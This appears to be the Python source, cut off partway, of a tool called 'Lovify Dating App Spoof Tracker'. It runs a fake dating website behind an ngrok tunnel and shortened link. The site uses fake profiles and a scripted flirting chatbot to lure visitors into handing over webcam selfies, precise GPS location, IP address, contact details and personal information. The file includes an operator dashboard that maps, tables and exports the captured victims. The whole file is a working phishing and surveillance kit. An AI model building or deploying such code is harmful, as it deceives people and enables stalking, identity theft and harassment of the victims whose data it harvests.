import sys
import threading
import time
import base64
import os
import csv
import random
from pathlib import Path

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QPushButton, QLabel, QLineEdit,
    QVBoxLayout, QHBoxLayout, QTextEdit, QTabWidget, QStatusBar,
    QMessageBox, QTableWidget, QTableWidgetItem, QFileDialog, QDialog,
    QFormLayout, QComboBox, QSpinBox, QDialogButtonBox, QCheckBox, QColorDialog, QFontComboBox, QSplitter
)
from PyQt6.QtGui import QIcon, QPixmap, QFont, QColor
from PyQt6.QtCore import Qt, QTimer, QUrl, pyqtSignal, QObject

from pyngrok import ngrok
from flask import Flask, request, render_template_string, jsonify

import requests

# --- Constants ---
SAVE_IMAGE_DIR = "captured_selfies"
PROFILE_EXPORT_FILE = "lovify_profiles_export.csv"

# --- Global Data Stores ---
access_logs = []
latitudes = []
longitudes = []
selfie_images = []

# --- Real-Time Fake Profiles and Chatbot Data ---
FAKE_PROFILES = [
    {
        "name": "Emily",
        "age": 23,
        "bio": "Dancer. Love dogs, sunsets, and deep talks. Looking for someone fun! 💃🐶🌅",
        "city": "Miami",
        "country": "USA",
        "photo": "https://images.unsplash.com/photo-1517841905240-472988babdf9?fit=facearea&w=300&h=300&facepad=2&q=80"
    },
    {
        "name": "Sophia",
        "age": 27,
        "bio": "Entrepreneur, foodie, and world traveler. Swipe right for adventure.",
        "city": "Barcelona",
        "country": "Spain",
        "photo": "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?fit=facearea&w=300&h=300&facepad=2&q=80"
    },
    {
        "name": "Mia",
        "age": 25,
        "bio": "Photographer & artist. I see beauty everywhere. Coffee addict ☕",
        "city": "Berlin",
        "country": "Germany",
        "photo": "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?fit=facearea&w=300&h=300&facepad=2&q=80"
    },
    {
        "name": "Olivia",
        "age": 28,
        "bio": "Fitness lover and yoga teacher. Can you keep up? 💪",
        "city": "Sydney",
        "country": "Australia",
        "photo": "https://images.unsplash.com/photo-1515378791036-0648a3ef77b2?fit=facearea&w=300&h=300&facepad=2&q=80"
    },
    {
        "name": "Ava",
        "age": 22,
        "bio": "Student. Netflix, memes, and puppies. Let's grab bubble tea?",
        "city": "Toronto",
        "country": "Canada",
        "photo": "https://images.unsplash.com/photo-1464983953574-0892a716854b?fit=facearea&w=300&h=300&facepad=2&q=80"
    },
]

FAKE_MESSAGES = [
    "Hey! 😊",
    "How's your day going?",
    "You look familiar! Were you at the concert last weekend?",
    "What's your favorite travel destination?",
    "I love hiking too! Ever tried the Appalachian Trail?",
    "Haha, that's funny 😂",
    "Coffee or tea?",
    "What are you passionate about?",
    "If you could live anywhere, where would it be?",
    "Cat person or dog person?"
]

# --- Map HTML Template ---
MAP_HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Geolocation Map</title>
    <style>html, body, #map { height: 100%; margin:0; padding:0; } </style>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css"/>
</head>
<body>
<div id="map"></div>
<script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
<script>
    var map = L.map('map').setView([20,0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '© OpenStreetMap contributors'
    }).addTo(map);
    window.pyCoords = [];
    function addPoint(lat, lng, label) {
        var marker = L.marker([lat, lng]).addTo(map);
        marker.bindPopup(label).openPopup();
        window.pyCoords.push([lat, lng]);
        if (window.pyCoords.length === 1) map.setView([lat, lng], 10);
    }
</script>
</body>
</html>
"""

# --- Flask HTML Template ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Lovify — Find Your Match!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;400&family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(130deg, #ff3366 0%, #fff0f5 100%);
            color: #1a1a1a;
            text-align: center;
            font-family: 'Inter', 'Montserrat', Arial, sans-serif;
            margin: 0;
            padding: 0;
            min-height: 100vh;
        }
        .navbar {
            width: 100vw;
            background: #fff;
            margin: 0 0 24px 0;
            box-shadow: 0 2px 12px #ff33661c;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 64px;
        }
        .navbar-logo {
            font-family: 'Montserrat', Arial, sans-serif;
            font-size: 2.1em;
            font-weight: bold;
            color: #ff3366;
            letter-spacing: 3px;
            text-shadow:0 0 10px #ffe8f0;
            margin-top: 9px;
        }
        .navbar-links {
            margin-left: 30px;
            flex: 1;
            text-align: right;
            padding-right: 44px;
        }
        .navbar-link {
            color: #ff3366;
            text-decoration: none;
            font-weight: 500;
            font-size: 1.08em;
            margin-right: 20px;
            transition: color 0.15s;
        }
        .navbar-link:hover {
            color: #d92b59;
            text-decoration: underline;
        }
        .card {
            background: #fff;
            border-radius: 22px;
            box-shadow: 0 8px 32px 0 rgba(255,51,102,0.10), 0 1.5px 3px #ffeaf1;
            width: 440px;
            margin: 30px auto 0 auto;
            padding: 35px 40px 30px 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        @media (max-width: 510px) {
            .card { width: 97vw; padding: 20px 6vw; }
        }
        .card h1 {
            font-size: 2.2em;
            font-family: 'Montserrat', Arial, sans-serif;
            font-weight: 700;
            letter-spacing: 2px;
            color: #ff3366;
            margin-bottom: 5px;
        }
        .subtitle {
            color: #888;
            font-size: 1.09em;
            margin-bottom: 18px;
        }
        .carousel {
            width: 100%;
            margin-bottom: 18px;
        }
        .carousel-img {
            width: 100%;
            border-radius: 14px;
            box-shadow:0 0 16px #ffe8f0;
        }
        .carousel-caption {
            font-size: 1.12em;
            color: #ff3366;
            font-family: 'Montserrat', Arial, sans-serif;
            font-weight: 600;
            margin-top: 7px;
        }
        .fake-profiles {
            margin: 16px 0 18px 0;
            display: flex;
            gap: 13px;
            overflow-x: auto;
            justify-content: center;
        }
        .fake-profile {
            background: #fff;
            border-radius: 14px;
            box-shadow: 0 2px 8px #ff33662a;
            width: 126px;
            min-width: 126px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 7px 6px 13px 6px;
        }
        .fake-profile img {
            width: 76px;
            height: 76px;
            border-radius: 50%;
            object-fit: cover;
            margin-top: 7px;
            margin-bottom: 4px;
            border: 2px solid #ff3366;
        }
        .fake-profile .f-name {
            font-family: 'Montserrat', Arial, sans-serif;
            color: #ff3366;
            font-weight: 700;
            font-size: 1.13em;
        }
        .fake-profile .f-bio {
            color: #555;
            font-size: 0.97em;
            margin-top: 1px;
        }
        .match-alert {
            background: linear-gradient(90deg, #ffb3c6, #ffe8f0 60%);
            color: #ff3366;
            font-weight: 600;
            font-size: 1.12em;
            padding: 8px 12px;
            border-radius: 8px;
            margin-bottom: 15px;
        }
        .chatbot {
            background: #f8f5fa;
            border-radius: 15px;
            box-shadow: 0 0 8px #ffe8f0;
            margin: 0 0 12px 0;
            padding: 11px 14px;
            text-align: left;
            width: 100%;
        }
        .chat-header {
            color: #ff3366;
            font-weight: 700;
            font-size: 1.03em;
            margin-bottom: 5px;
        }
        .chat-messages {
            min-height: 40px;
            font-size: 0.99em;
            color: #555;
        }
        .chat-input-row {
            display: flex;
            margin-top: 8px;
        }
        .chat-input-row input {
            flex: 1;
            padding: 6px 9px;
            border-radius: 8px;
            border: 1.5px solid #ff3366;
            font-size: 1em;
            font-family: 'Inter', Arial, sans-serif;
        }
        .chat-input-row button {
            margin-left: 8px;
            padding: 6px 14px;
            background: #ff3366;
            color: #fff;
            border: none;
            border-radius: 7px;
            font-weight: 700;
            cursor: pointer;
        }
        .field-label {
            font-family: 'Montserrat', Arial, sans-serif;
            color: #1a1a1a;
            font-weight: 600;
            margin-bottom: 2px;
            font-size: 1.05em;
            text-align: left;
            display: block;
        }
        .profile-field, select, textarea {
            width: 100%;
            font-size: 1.04em;
            padding: 10px 9px;
            margin-bottom: 14px;
            border: 1.7px solid #ff3366;
            border-radius: 7px;
            background: #f8f5fa;
            font-family: 'Inter', Arial, sans-serif;
            color: #1a1a1a;
            box-sizing: border-box;
            transition: box-shadow 0.2s;
        }
        select { background: #f8f5fa; }
        .profile-field:focus, select:focus, textarea:focus {
            outline: none;
            box-shadow: 0 0 0 3px #ffe8f0;
            background: #fff;
        }
        textarea {
            min-height: 50px;
            resize: vertical;
        }
        .consent-row {
            margin-bottom: 14px;
            text-align: left;
        }
        .consent-row label {
            font-weight: 500;
            color: #333;
            font-size: 1em;
        }
        .consent-row input[type=checkbox] {
            width: 20px;
            height: 20px;
            vertical-align: middle;
            accent-color: #ff3366;
        }
        #capture-btn {
            margin: 16px auto 0 auto;
            padding: 14px 0;
            width: 100%;
            background: linear-gradient(90deg, #ff3366 40%, #ff8fa3 100%);
            color: #fff;
            font-weight: 700;
            border: none;
            border-radius: 8px;
            font-size: 1.13em;
            font-family: 'Montserrat', Arial, sans-serif;
            cursor: pointer;
            box-shadow: 0 2px 16px #ff336622;
            letter-spacing: 1px;
            transition: background 0.2s, color 0.2s;
        }
        #capture-btn:disabled {
            background: #eee;
            color: #aaa;
            border: none;
            box-shadow: none;
            cursor: not-allowed;
        }
        #video {
            border: 2.5px solid #ff3366;
            border-radius: 14px;
            margin-top: 10px;
            box-shadow: 0 0 16px #ff8fa3;
            display: none;
        }
        #geo {
            margin-top: 14px;
            color: #ff3366;
            font-size: 17px;
            font-family: 'Montserrat', Arial, sans-serif;
            text-shadow: 0 0 10px #ffe8f0;
        }
        #datetime {
            color: #888;
            font-size: 16px;
            margin-top: 8px;
        }
        .extra-fields {
            margin-bottom: 8px;
            text-align: left;
        }
        .extra-fields label {
            font-size: 1em;
            font-weight: 500;
            color: #444;
        }
        .footer {
            margin: 48px auto 10px auto;
            text-align: center;
            color: #aaa;
            font-size: 1.04em;
            font-family: 'Inter', Arial, sans-serif;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="navbar-logo">Lovify</div>
        <div class="navbar-links">
            <a href="#" class="navbar-link">Browse</a>
            <a href="#" class="navbar-link">Premium</a>
            <a href="#" class="navbar-link">Safety</a>
            <a href="#" class="navbar-link">Help</a>
        </div>
    </div>
    <div class="card">
        <div class="carousel">
            <img class="carousel-img" src="https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=facearea&w=700&h=220&facepad=2&q=90" alt="Couple" />
            <div class="carousel-caption">Find your soulmate. 100% safe & real people.</div>
        </div>
        <div class="fake-profiles" id="matches-bar"></div>
        <div class="match-alert" id="match-alert" style="display:none;">🔥 You have a hot new match! Start chatting below!</div>
        <div class="chatbot" id="chat-bot" style="display:none;">
            <div class="chat-header" id="chat-header"></div>
            <div class="chat-messages" id="chat-messages"></div>
            <form class="chat-input-row" id="chat-form">
                <input type="text" id="chat-input" placeholder="Type a message..."/>
                <button type="submit">Send</button>
            </form>
        </div>
        <h1>Lovify Match</h1>
        <div class="subtitle">Create your Lovify profile to find your match!</div>
        <form id="profile-form" autocomplete="off">
            <label class="field-label">Full Name:
                <input class="profile-field" type="text" id="name" maxlength="40" autocomplete="name" required>
            </label>
            <label class="field-label">Age:
                <input class="profile-field" type="number" min="18" max="99" id="age" required>
            </label>
            <label class="field-label">Gender:
                <select class="profile-field" id="gender" required>
                    <option value="">Select</option>
                    <option>Woman</option>
                    <option>Man</option>
                    <option>Non-binary</option>
                    <option>Other</option>
                </select>
            </label>
            <label class="field-label">Email:
                <input class="profile-field" type="email" id="email" maxlength="60" autocomplete="email" required>
            </label>
            <label class="field-label">Phone (optional):
                <input class="profile-field" type="tel" id="phone" maxlength="20" autocomplete="tel">
            </label>
            <label class="field-label">Instagram (optional):
                <input class="profile-field" type="text" id="instagram" maxlength="40">
            </label>
            <label class="field-label">About Me:
                <textarea class="profile-field" id="bio" maxlength="180" rows="2" placeholder="Tell us about yourself" required></textarea>
            </label>
            <label class="field-label">Looking for:
                <input class="profile-field" type="text" id="lookingfor" maxlength="60" placeholder="e.g. a fun date, friendship, serious relationship" required>
            </label>
            <div class="extra-fields">
                <label>City:<input class="profile-field" type="text" id="city" maxlength="30"></label>
                <label>Country:<input class="profile-field" type="text" id="country" maxlength="30"></label>
                <label>Job:<input class="profile-field" type="text" id="job" maxlength="50"></label>
                <label>Birthday:<input class="profile-field" type="date" id="birthday" max="9999-12-31"></label>
                <label>Relationship Status:
                    <select class="profile-field" id="relationship">
                        <option value="">Select</option>
                        <option>Single</option>
                        <option>Divorced</option>
                        <option>Widowed</option>
                        <option>Complicated</option>
                    </select>
                </label>
                <label>Languages Spoken:
                    <input class="profile-field" type="text" id="languages" maxlength="60" placeholder="e.g. English, Spanish">
                </label>
                <label>Favorite Music:
                    <input class="profile-field" type="text" id="music" maxlength="60" placeholder="e.g. Pop, Jazz, EDM">
                </label>
                <label>Pets (optional):
                    <input class="profile-field" type="text" id="pets" maxlength="40">
                </label>
            </div>
            <div class="consent-row">
                <input type="checkbox" id="consent">
                <label for="consent"><b>
                I consent to provide my selfie, location, and profile info</b>
                </label>
            </div>
            <video id="video" autoplay playsinline width="320" height="220"></video><br>
            <button id="capture-btn" disabled>Take Selfie & Join</button>
            <canvas id="canvas" width="320" height="220" style="display:none;"></canvas>
            <div id="geo"></div>
            <div id="datetime"></div>
        </form>
    </div>
    <div class="footer">© 2025 Lovify &mdash; All rights reserved. | <a href="#" style="color:#ff3366">Terms</a> | <a href="#" style="color:#ff3366">Privacy</a></div>
    <script>
        // --- Fake Profiles ---
        var fakeProfiles = [
            {"name":"Emily","age":23,"bio":"Dancer. Love dogs, sunsets, and deep talks. Looking for someone fun! 💃🐶🌅","city":"Miami","country":"USA","photo":"https://images.unsplash.com/photo-1517841905240-472988babdf9?fit=facearea&w=300&h=300&facepad=2&q=80"},
            {"name":"Sophia","age":27,"bio":"Entrepreneur, foodie, and world traveler. Swipe right for adventure.","city":"Barcelona","country":"Spain","photo":"https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?fit=facearea&w=300&h=300&facepad=2&q=80"},
            {"name":"Mia","age":25,"bio":"Photographer & artist. I see beauty everywhere. Coffee addict ☕","city":"Berlin","country":"Germany","photo":"https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?fit=facearea&w=300&h=300&facepad=2&q=80"},
            {"name":"Olivia","age":28,"bio":"Fitness lover and yoga teacher. Can you keep up? 💪","city":"Sydney","country":"Australia","photo":"https://images.unsplash.com/photo-1515378791036-0648a3ef77b2?fit=facearea&w=300&h=300&facepad=2&q=80"},
            {"name":"Ava","age":22,"bio":"Student. Netflix, memes, and puppies. Let's grab bubble tea?","city":"Toronto","country":"Canada","photo":"https://images.unsplash.com/photo-1464983953574-0892a716854b?fit=facearea&w=300&h=300&facepad=2&q=80"}
        ];
        function renderFakeProfiles() {
            let bar = document.getElementById("matches-bar");
            bar.innerHTML = '';
            for (let f of fakeProfiles) {
                bar.innerHTML += `<div class="fake-profile"><img src="${f.photo}" alt="profile"/><div class="f-name">${f.name}, ${f.age}</div><div class="f-bio">${f.bio.substr(0,35)}...</div></div>`;
            }
        }
        renderFakeProfiles();

        // --- Real-Time Match Alert and Chatbot ---
        let matchedProfile = null;
        function triggerMatch() {
            if (!matchedProfile) {
                matchedProfile = fakeProfiles[Math.floor(Math.random()*fakeProfiles.length)];
                document.getElementById("match-alert").style.display = "";
                document.getElementById("chat-bot").style.display = "";
                document.getElementById("chat-header").innerText = "Chat with " + matchedProfile.name;
                document.getElementById("chat-messages").innerHTML = `<b>${matchedProfile.name}:</b> ${["Hey! 😊","How's your day going?"][Math.floor(Math.random()*2)]}`;
            }
        }
        setTimeout(triggerMatch, 3200 + Math.random()*4000);

        document.getElementById("chat-form").onsubmit = function(e){
            e.preventDefault();
            let inp = document.getElementById("chat-input");
            let val = inp.value.trim();
            if (!val) return;
            let chat = document.getElementById("chat-messages");
            chat.innerHTML += `<br><b>You:</b> ${val}`;
            setTimeout(function(){
                let botReplies = [
                    "Haha, I feel the same!",
                    "That's awesome! Tell me more.",
                    "I love that 😍.",
                    "What do you do for fun on weekends?",
                    "Would you like to meet for coffee sometime?",
                    "Haha, you're funny! 😂"
                ];
                chat.innerHTML += `<br><b>${matchedProfile.name}:</b> ${botReplies[Math.floor(Math.random()*botReplies.length)]}`;
                chat.scrollTop = chat.scrollHeight;
            }, 1300 + Math.random()*900);
            inp.value = "";
        };

        // --- Profile form, webcam, geolocation code ---
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const captureBtn = document.getElementById("capture-btn");
        const consentChk = document.getElementById("consent");
        const profileForm = document.getElementById("profile-form");
        let latitude = null;
        let longitude = null;
        let webcamOk = false;
        let geoOk = false;

        function updateTime() {
            const dt = new Date();
            document.getElementById("datetime").innerText = "Your local time: " + dt.toLocaleString();
        }
        setInterval(updateTime, 1000); updateTime();

        function allProfileValid() {
            return (
                profileForm.name.value.trim().length > 0 &&
                +profileForm.age.value >= 18 &&
                profileForm.gender.value &&
                profileForm.email.value.trim().length > 4 &&
                profileForm.bio.value.trim().length > 0 &&
                profileForm.lookingfor.value.trim().length > 0
            );
        }
        profileForm.oninput = function() { checkReady(); };

        consentChk.onchange = function() {
            if (this.checked) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        video.style.display = "block";
                        webcamOk = true;
                        checkReady();
                    })
                    .catch(err => {
                        alert("Webcam access denied.");
                    });
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        latitude = position.coords.latitude;
                        longitude = position.coords.longitude;
                        document.getElementById("geo").innerText =
                            "Your location: " + latitude.toFixed(6) + ", " + longitude.toFixed(6);
                        geoOk = true;
                        checkReady();
                    },
                    function(error) {
                        document.getElementById("geo").innerText = "Geolocation failed.";
                    }
                );
            } else {
                video.style.display = "none";
                captureBtn.disabled = true;
            }
        };

        function checkReady() {
            if (consentChk.checked && webcamOk && geoOk && allProfileValid()) {
                captureBtn.disabled = false;
            } else {
                captureBtn.disabled = true;
            }
        }

        captureBtn.onclick = function(e) {
            e.preventDefault();
            if (!consentChk.checked || !allProfileValid()) {
                alert("Complete your profile and provide consent first!");
                return;
            }
            if (latitude === null || longitude === null) {
                alert("Location not yet available!");
                return;
            }
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL("image/png");
            fetch("/selfie", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    image: imageData,
                    latitude: latitude,
                    longitude: longitude,
                    name: profileForm.name.value.trim(),
                    age: profileForm.age.value.trim(),
                    gender: profileForm.gender.value,
                    email: profileForm.email.value.trim(),
                    phone: profileForm.phone.value.trim(),
                    instagram: profileForm.instagram.value.trim(),
                    city: profileForm.city.value.trim(),
                    country: profileForm.country.value.trim(),
                    job: profileForm.job.value.trim(),
                    bio: profileForm.bio.value.trim(),
                    lookingfor: profileForm.lookingfor.value.trim(),
                    birthday: profileForm.birthday.value.trim(),
                    relationship: profileForm.relationship.value.trim(),
                    languages: profileForm.languages.value.trim(),
                    music: profileForm.music.value.trim(),
                    pets: profileForm.pets.value.trim()
                })
            }).then(() => {
                alert("Welcome to Lovify! Your profile is submitted.");
                captureBtn.disabled = true;
                captureBtn.innerText = "Profile Submitted";
            });
            fetch("/track", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    latitude: latitude,
                    longitude: longitude
                })
            });
        };
    </script>
</body>
</html>
"""

# --- Flask Backend ---
app = Flask(__name__)

@app.errorhandler(Exception)
def handle_error(e):
    print(f"Flask Internal error: {e}", file=sys.stderr)
    return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/", methods=["GET"])
def serve_html():
    return render_template_string(HTML_TEMPLATE)

@app.route("/track", methods=["POST"])
def track():
    try:
        data = request.json
        latitude = data.get("latitude") if data else None
        longitude = data.get("longitude") if data else None
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"{timestamp} | IP: {ip}"
        access_logs.append(log_entry)
        latitudes.append(str(latitude) if latitude is not None else "")
        longitudes.append(str(longitude) if longitude is not None else "")
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"[ERROR] /track: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/selfie", methods=["POST"])
def save_selfie():
    try:
        data = request.json
        image_data = data.get("image") if data else None
        latitude = data.get("latitude") if data else None
        longitude = data.get("longitude") if data else None
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        timestamp = time.strftime('%Y-%m-%d_%H-%M-%S')
        # Extra profile details
        name = data.get("name") or ""
        age = data.get("age") or ""
        gender = data.get("gender") or ""
        bio = data.get("bio") or ""
        lookingfor = data.get("lookingfor") or ""
        email = data.get("email") or ""
        phone = data.get("phone") or ""
        instagram = data.get("instagram") or ""
        city = data.get("city") or ""
        country = data.get("country") or ""
        job = data.get("job") or ""
        birthday = data.get("birthday") or ""
        relationship = data.get("relationship") or ""
        languages = data.get("languages") or ""
        music = data.get("music") or ""
        pets = data.get("pets") or ""
        if not image_data or not image_data.startswith("data:image/png;base64,"):
            raise ValueError("Invalid or missing image data.")
        header, encoded = image_data.split(",", 1)
        img_bytes = base64.b64decode(encoded)
        filename = f"{timestamp}_{ip.replace(':','_')}.png"
        filepath = os.path.join(SAVE_IMAGE_DIR, filename)
        os.makedirs(SAVE_IMAGE_DIR, exist_ok=True)
        with open(filepath, "wb") as f:
            f.write(img_bytes)
        selfie_images.append((timestamp, ip, filename, latitude, longitude, name, age, gender, bio, lookingfor, email, phone, instagram, city, country, job, birthday, relationship, languages, music, pets))
        return jsonify({"status": "saved"})
    except Exception as e:
        print(f"[ERROR] /selfie: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/logs")
def api_logs():
    try:
        return jsonify({
            "logs": access_logs[-20:],
            "lat": latitudes[-5:],
            "long": longitudes[-5:]
        })
    except Exception as e:
        print(f"[ERROR] /api/logs: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/selfies")
def api_selfies():
    try:
        return jsonify([
            {"timestamp": ts, "ip": ip, "filename": filename, "latitude": lat, "longitude": lng,
             "name": name, "age": age, "gender": gender, "bio": bio, "lookingfor": lookingfor,
             "email": email, "phone": phone, "instagram": instagram, "city": city, "country": country, "job": job,
             "birthday": birthday, "relationship": relationship, "languages": languages, "music": music, "pets": pets}
            for (ts, ip, filename, lat, lng, name, age, gender, bio, lookingfor, email, phone, instagram, city, country, job, birthday, relationship, languages, music, pets) in selfie_images[-40:]
        ])
    except Exception as e:
        print(f"[ERROR] /api/selfies: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

def run_flask(port):
    app.run(port=port, debug=False, use_reloader=False)

# --- PyQt6 GUI ---
from PyQt6.QtWebEngineWidgets import QWebEngineView

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Lovify Dating App Spoof Tracker")
        self.setWindowIcon(QIcon("logo.ico"))
        self.resize(1700, 880)
        self.flask_thread = None
        self.tunnel = None
        self.server_running = False
        self.short_url = ""
        self.ngrok_port = None
        self.font_size = 20
        self.theme = {
            "background": "#f6f8fb","foreground": "#1a1a1a","button": "#ff3366",
            "button_text": "#fff","button_border": "#ff3366","hover": "#ffe8f0",
            "tab": "#fff","tab_selected": "#ff3366","tab_selected_text": "#fff","header": "#f6f8fb"
        }
        self.font_family = "Montserrat"

        self.setup_ui()
        self.apply_theme()

        self.timer = QTimer()
        self.timer.timeout.connect(self.update_logs_and_selfies)
        self.timer.start(2000)

    def setup_ui(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        self.setCentralWidget(widget)

        toolbar = self.addToolBar("Toolbar")
        toolbar.setMovable(False)
        btn_settings = QPushButton("Settings")
        btn_settings.clicked.connect(self.open_settings)
        toolbar.addWidget(btn_settings)
        btn_export = QPushButton("Export Profiles")
        btn_export.clicked.connect(self.export_profiles)
        toolbar.addWidget(btn_export)
        btn_about = QPushButton("About")
        btn_about.clicked.connect(self.show_about)
        toolbar.addWidget(btn_about)

        self.heading = QLabel("💗 Lovify — Dating App Tracker 💗")
        self.heading.setFont(QFont(self.font_family, self.font_size + 8, QFont.Weight.Bold))
        self.heading.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(self.heading)

        controls = QHBoxLayout()
        layout.addLayout(controls)
        controls.addWidget(QLabel("Port:"))
        self.port_input = QLineEdit("5000")
        self.port_input.setMaximumWidth(110)
        self.port_input.setFont(QFont("Consolas", self.font_size))
        controls.addWidget(self.port_input)
        self.start_btn = QPushButton("Start Server")
        self.start_btn.clicked.connect(self.handle_start)
        controls.addWidget(self.start_btn)
        self.stop_btn = QPushButton("Stop Server")
        self.stop_btn.clicked.connect(self.handle_stop)
        controls.addWidget(self.stop_btn)
        controls.addStretch()

        url_box = QHBoxLayout()
        layout.addLayout(url_box)
        url_box.addWidget(QLabel("ngrok URL:"))
        self.url_display = QLineEdit()
        self.url_display.setReadOnly(True)
        self.url_display.setFont(QFont("Consolas", self.font_size - 2))
        url_box.addWidget(self.url_display)
        self.copy_url_btn = QPushButton("Copy")
        self.copy_url_btn.clicked.connect(self.copy_url)
        url_box.addWidget(self.copy_url_btn)
        self.shorten_url_btn = QPushButton("Shorten")
        self.shorten_url_btn.clicked.connect(self.shorten_url)
        url_box.addWidget(self.shorten_url_btn)

        short_box = QHBoxLayout()
        layout.addLayout(short_box)
        short_box.addWidget(QLabel("Shortened URL:"))
        self.short_url_display = QLineEdit()
        self.short_url_display.setReadOnly(True)
        self.short_url_display.setFont(QFont("Consolas", self.font_size - 2))
        short_box.addWidget(self.short_url_display)
        self.copy_short_btn = QPushButton("Copy")
        self.copy_short_btn.clicked.connect(self.copy_short_url)
        short_box.addWidget(self.copy_short_btn)

        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)

        # --- Profiles Tab ---
        self.profiles_tab = QWidget()
        self.tabs.addTab(self.profiles_tab, "Profiles")
        profiles_layout = QVBoxLayout(self.profiles_tab)
        self.profile_table = QTableWidget(0, 21)
        self.profile_table.setHorizontalHeaderLabels(
            ["Timestamp", "IP", "Lat", "Long", "Name", "Age", "Gender", "Bio", "Looking For", "Email", "Phone",
             "Instagram", "City", "Country", "Job", "Birthday", "Relationship", "Languages", "Music", "Pets", "Selfie"]
        )
        for col, width in enumerate([
            175, 140, 75, 75, 120, 55, 90, 160, 150, 180, 110, 120, 90, 100, 100, 100, 100, 100, 120, 100, 80, 180
        ]):
            self.profile_table.setColumnWidth(col, width)
        profiles_layout.addWidget(self.profile_table)
        self.save_sel_btn = QPushButton("Save Selected Selfie As...")
        profiles_layout.addWidget(self.save_sel_btn)
        self.save_sel_btn.clicked.connect(self.save_selected_selfie)

        # --- Logs Tab ---
        self.log_tab = QWidget()
        self.tabs.addTab(self.log_tab, "Access Logs")
        log_layout = QVBoxLayout(self.log_tab)
        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        self.log_display.setFont(QFont("Fira Mono", self.font_size - 2))
        log_layout.addWidget(self.log_display)

        # --- Geolocation Tab (with OpenStreetMap) ---
        self.geo_tab = QWidget()
        self.tabs.addTab(self.geo_tab, "Geolocation")
        geo_layout = QHBoxLayout(self.geo_tab)
        # Map (Leaflet/OpenStreetMap)
        self.map_view = QWebEngineView()
        self.map_view.setHtml(MAP_HTML_TEMPLATE)
        geo_layout.addWidget(self.map_view, 3)
        # Lat/long display
        coord_box = QVBoxLayout()
        self.lat_display = QTextEdit()
        self.lat_display.setReadOnly(True)
        self.lat_display.setFont(QFont("Fira Mono", self.font_size - 2))
        coord_box.addWidget(QLabel("Latitude:"))
        coord_box.addWidget(self.lat_display)
        self.long_display = QTextEdit()
        self.long_display.setReadOnly(True)
        self.long_display.setFont(QFont("Fira Mono", self.font_size - 2))
        coord_box.addWidget(QLabel("Longitude:"))
        coord_box.addWidget(self.long_display)
        geo_layout.addLayout(coord_box, 1)

        self.status = QStatusBar()
        self.status.setFont(QFont("Consolas", self.font_size - 2))
        self.setStatusBar(self.status)

    def apply_theme(self):
        theme = self.theme
        style = f"""
        QWidget {{
            background-color: {theme['background']};
            color: {theme['foreground']};
            font-family: "{self.font_family}";
        }}
        QLabel, QLineEdit, QTextEdit, QTabWidget::pane, QTableWidget, QToolBar, QStatusBar, QTabBar::tab {{
            color: {theme['foreground']};
            font-size: {self.font_size}px;
            font-family: "{self.font_family}";
        }}
        QPushButton {{
            background-color: {theme['button']};
            color: {theme['button_text']};
            border: 2px solid {theme['button_border']};
            border-radius: 8px;
            font-size: {self.font_size}px;
            padding: 10px 25px;
            margin: 3px;
            font-weight: bold;
        }}
        QPushButton:hover {{
            background-color: {theme['hover']};
            color: {theme['background']};
            border: 2px solid {theme['hover']};
        }}
        QTabBar::tab:selected {{
            background: {theme['tab_selected']};
            color: {theme['tab_selected_text']};
        }}
        QTabBar::tab {{
            background: {theme['tab']};
            color: {theme['foreground']};
        }}
        QHeaderView::section {{
            background: {theme['header']};
            color: {theme['foreground']};
        }}
        """
        self.setStyleSheet(style)
        self.heading.setFont(QFont(self.font_family, self.font_size + 8, QFont.Weight.Bold))
        self.update_fonts()

    def handle_start(self):
        port = int(self.port_input.text())
        if self.server_running:
            self.status.showMessage("Already running", 2000)
            return
        self.flask_thread = threading.Thread(target=run_flask, args=(port,), daemon=True)
        self.flask_thread.start()
        time.sleep(1.3)
        try:
            self.tunnel = ngrok.connect(port)
